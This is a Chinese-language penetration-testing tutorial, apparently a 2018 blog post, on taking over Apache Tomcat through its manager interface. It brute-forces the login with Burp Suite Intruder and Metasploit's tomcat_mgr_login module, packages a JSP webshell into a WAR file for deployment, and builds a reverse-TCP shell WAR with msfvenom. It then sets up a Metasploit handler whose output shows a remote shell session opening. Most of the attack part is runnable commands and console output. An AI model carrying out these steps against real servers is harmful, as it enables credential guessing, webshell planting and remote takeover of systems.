# 渗透中tomcat部署war包Getshell

------

本文演示一下tomcat后台getshell

------

## Tomcat 爆破

在渗透测试中，我们经常遇到tomcat后台被默认部署在外部的情况，类似于`http://10.211.55.3:8080/host-manager/html`

在这种情况下，我们都会选择去爆破来进入后台部署shell。

先抓取一下我们的登录包：

```txt
GET /manager/html HTTP/1.1
Host: 10.211.55.3:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://10.211.55.3:8080/
X-Forwarded-For: 8.8.8.8
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46MTIzNDU2
```

在Tomcat后台登录的数据包中我们发现它会将输入的账号和密码都编码成Base64密文。

格式：`用户名:密码` => `admin:123456` => `YWRtaW46MTIzNDU2`

这里我们可以采用Metasploit中的tomcat爆破辅助模块，当然也可以用BurpSuite来爆破：

将数据包发送到Intruder模块，添加一个变量：

![Snipaste_2018-10-18_01-29-00.png](https://whitecell.io/upload/attach/201810/151_NKBYEWY9B2ZKU7H.png "Snipaste_2018-10-18_01-29-00.png")

在设置Payload的时候要使用自定义迭代器：

![Snipaste_2018-10-18_01-31-24.png](https://whitecell.io/upload/attach/201810/151_Q9JMSKK9KDWHBTF.png "Snipaste_2018-10-18_01-31-24.png")

由于登录令牌都是`base64`加密的，我们需要 `[用户名]:[密码]`这样的格式进行`base64encde`才可以发送出去，我们设置三个迭代payload分别代表：`用户名`、`:`、`密码`。

![Snipaste_2018-10-18_01-34-53.png](https://whitecell.io/upload/attach/201810/151_SVFKXWCMR6UECH2.png "Snipaste_2018-10-18_01-34-53.png")

第一位设置用户名这类的字典，可以多个。

![Snipaste_2018-10-18_01-36-09.png](https://whitecell.io/upload/attach/201810/151_6RPC99NSAX3MRDZ.png "Snipaste_2018-10-18_01-36-09.png")

第二位设置`:`，只需要一个即可。

![Snipaste_2018-10-18_01-38-03.png](https://whitecell.io/upload/attach/201810/151_DJ9FQFGQRQAPCBF.png "Snipaste_2018-10-18_01-38-03.png")

第三位设置密码，可以多个。

然后设置一个编码器，选择`base64`这个函数：

![Snipaste_2018-10-18_01-40-48.png](https://whitecell.io/upload/attach/201810/151_Z4AXQ376FZM53TP.png "Snipaste_2018-10-18_01-40-48.png")

接下来再将url编码去掉，因为在`base64`密文里`=`会被编码成`%3d`。

![Snipaste_2018-10-18_01-42-34.png](https://whitecell.io/upload/attach/201810/151_75EWNA5QXG8BGR6.png "Snipaste_2018-10-18_01-42-34.png")

设置完毕后，我们可以爆破了：

![Snipaste_2018-10-18_01-44-10.png](https://whitecell.io/upload/attach/201810/151_HBR9D4J4XCU9M2F.png "Snipaste_2018-10-18_01-44-10.png")

---

## Tomcat 部署war getshell

在获取到令牌后，我们可以进入Tomcat后台了：

![Snipaste_2018-10-18_01-46-08.png](https://whitecell.io/upload/attach/201810/151_XZHN2NWHQG439Q7.png "Snipaste_2018-10-18_01-46-08.png")

在这个后台，我们可以操作每个应用的状态……以及读取每个应用下的Session。

但是这都不是最大的安全隐患 :)

下面来讲一下如何制作war包。

> war包：Java web工程，都是打成war包，进行发布，如果我们的服务器选择TOMCAT等轻量级服务器，一般就打出WAR包进行发布

![Snipaste_2018-10-18_01-49-14.png](https://whitecell.io/upload/attach/201810/151_CCU4URBB2Q8CA8N.png "Snipaste_2018-10-18_01-49-14.png")

先准备了一个JSP的一句话木马，安装好JDK环境，我的目录是在`C:\Program Files\Java\jdk1.8.0_181\bin`,这个目录下有一个文件叫·jar.exe·。

执行:`jar -cvf [war包名称].war 打包目录`

`"C:\Program Files\Java\jdk1.8.0_181\bin\jar.exe" -cvf test.war *`

![Snipaste_2018-10-18_01-56-52.png](https://whitecell.io/upload/attach/201810/151_AGDXA78D2BNF7JE.png "Snipaste_2018-10-18_01-56-52.png")

我们现在已经打包好了一个WAR包。

找到Tomcat管理页面中的`WAR file to deploy`进行上传就可以部署了。

![Snipaste_2018-10-18_01-58-33.png](https://whitecell.io/upload/attach/201810/151_4SCAQPTN82KJ5GP.png "Snipaste_2018-10-18_01-58-33.png")

应用列表已经出现了我们的目录：

![Snipaste_2018-10-18_02-00-39.png](https://whitecell.io/upload/attach/201810/151_UB3G4ZGJMNHPBFT.png "Snipaste_2018-10-18_02-00-39.png")

访问文件名即可：

![Snipaste_2018-10-18_02-04-45.png](https://whitecell.io/upload/attach/201810/151_P835MXRY3C6YJG5.png "Snipaste_2018-10-18_02-04-45.png")

![Snipaste_2018-10-18_02-06-04.png](https://whitecell.io/upload/attach/201810/151_XPY2BBEJ5QVBZAH.png "Snipaste_2018-10-18_02-06-04.png")

![Snipaste_2018-10-18_02-07-32.png](https://whitecell.io/upload/attach/201810/151_YWV8N67JMSC4EFD.png "Snipaste_2018-10-18_02-07-32.png")

---

## 总结

在爆破的时候发现频率过高会有爆破不成功的现象，最好是调整一下短时间内请求的次数。

---

## 采用Metasploit中的tomcat爆破辅助模块

有一些工具可用于利用Tomcat管理器。Metasploit包含一个用于强制登录凭据的辅助模块。

```txt
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.211.55.3
RHOSTS => 10.211.55.3
msf auxiliary(tomcat_mgr_login) > set RPORT 8080
RPORT => 8080
msf auxiliary(tomcat_mgr_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(tomcat_mgr_login) > run
[+] 110.211.55.3:8080 - LOGIN SUCCESSFUL: tomcat:tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```txt
i] Database already started
[i] The database appears to be already configured, skipping initialization
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.211.55.3
RHOSTS => 10.211.55.3
msf auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
RPORT => 8080
msf auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/http/tomcat_mgr_login) > run

[-] 10.211.55.3:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 10.211.55.3:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 10.211.55.3:8080 - Login Successful: tomcat:tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/tomcat_mgr_login) > 
```

![Snipaste_2018-10-18_02-23-37.png](https://whitecell.io/upload/attach/201810/151_SDPK2EYHQTW8ET4.png "Snipaste_2018-10-18_02-23-37.png")

---

## 利用漏洞

生成包含反向TCP shell的恶意WAR文件。相应地配置本地IP和端口。

```txt
msfvenom -p java/shell_reverse_tcp LHOST=172.16.245.143 LPORT=4444 -f war > shell3.war
```

在Metasploit中设置处理程序然后访问manger接口以部署恶意WAR。上传后，请务必至少访问一次恶意URL（在应用程序列表中可用）以使WAR执行。你应该在Metasploit处理程序中收到一个shell。

```txt
use exploit/multi/handler
set PAYLOAD java/shell_reverse_tcp
set LHOST 172.16.245.143
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

```txt
[i] Database already started
[i] The database appears to be already configured, skipping initialization
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD java/shell_reverse_tcp
PAYLOAD => java/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 172.16.245.143
LHOST => 172.16.245.143
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 172.16.245.143:4444 
msf exploit(multi/handler) > [*] Command shell session 1 opened (172.16.245.143:4444 -> 172.16.245.1:53088) at 2018-10-18 02:37:15 +0800
msf exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type             Information                                                                       Connection
  --  ----  ----             -----------                                                                       ----------
  1         shell java/java  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Program F...  172.16.245.143:4444 -> 172.16.245.1:53088 (172.16.245.1)
```

![Snipaste_2018-10-18_02-40-23.png](https://whitecell.io/upload/attach/201810/151_96N9ENZ9F99TJP5.png "Snipaste_2018-10-18_02-40-23.png")

![Snipaste_2018-10-18_02-42-05.png](https://whitecell.io/upload/attach/201810/151_G5C94KHFNR42UWN.png "Snipaste_2018-10-18_02-42-05.png")

------

博客作者，文章总结者 [@Mannix][1]      
2018 年 10 月 18 日

原始参考文档作者 [@Rvn0xsy][2]     
2017 年 08 月 17 日

[1]: http://mannix.top/
[2]: https://payloads.online/archivers/2017-08-17/2















